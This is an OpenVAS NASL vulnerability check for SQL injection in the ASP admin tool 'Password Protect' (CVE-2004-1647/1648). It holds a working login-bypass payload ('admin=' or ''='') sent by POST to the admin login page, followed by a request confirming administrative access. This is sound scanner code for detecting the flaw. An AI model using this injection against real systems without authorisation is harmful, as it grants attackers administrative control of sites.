###############################################################################
# OpenVAS Vulnerability Test
# $Id: passwordprotect_sql_inject.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# Password Protect SQL Injection
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Contact: Criolabs <security@criolabs.net>
# Subject: Password Protect XSS and SQL-Injection vulnerabilities.
# Date:     31.8.2004 02:17

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14587");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1647", "CVE-2004-1648");
  script_bugtraq_id(11073);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Password Protect SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade to the latest version of this software.");

  script_tag(name:"summary", value:"Password Protect is a password protected script allowing you to manage a
  remote site through an ASP based interface.");

  script_tag(name:"impact", value:"An SQL Injection vulnerability in the product allows remote attackers to
  inject arbitrary SQL statements into the remote database and to gain
  administrative access on this service.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_asp( port:port ) )
  exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + "/adminSection/main.asp";
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  v = eregmatch( pattern: "Set-Cookie: *([^; \t\r\n]+)", string:res );
  if( isnull( v ) ) continue; # Cookie is not available
  cookie = v[1];

  useragent = http_get_user_agent();
  req = string( "POST /", dir, "/adminSection/index_next.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 57\r\n",
                "\r\n",
                "admin=%27+or+%27%27%3D%27&Pass=password&BTNSUBMIT=+Login+\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  req = string( "GET /", dir, "/adminSection/main.asp HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Accept: */*\r\n",
                "Connection: close\r\n",
                "Cookie: ", cookie, "\r\n",
                "\r\n" );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "Web Site Administration" >< res && "The Web Animations Administration Section" >< res ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );